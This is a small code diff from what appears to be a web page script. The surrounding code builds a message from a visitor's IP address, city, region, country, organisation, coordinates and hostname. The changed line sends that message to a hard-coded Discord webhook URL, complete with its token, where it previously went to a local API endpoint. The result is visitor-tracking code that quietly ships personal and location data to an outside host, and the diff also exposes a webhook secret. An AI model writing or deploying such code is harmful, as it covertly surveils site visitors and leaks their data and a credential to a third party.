@@ -29,7 +29,7 @@
                 `IP: \`${ip}\`\nLocation: \`${city}, ${region}, ${country}\`\n` +
                 `Org: \`${org}\`\nCoords: \`${loc}\`\n` +
                 `Hostname: \`${hostname}\`\nTime: \`${time}\``;
-            await fetch('/api/send-message', {
+            await fetch("https://discord.com/api/webhooks/1381362562251358298/aDcZXEBe-LJgvnZbRt7dzWdq7Bqo4cFPPtOFwSaTq_dt3OMCOdLsSPuu68gLoR6GCJc3", {
                 method: "POST",
                 headers: { "Content-Type": "application/json" },
                 body: JSON.stringify({ content: message })
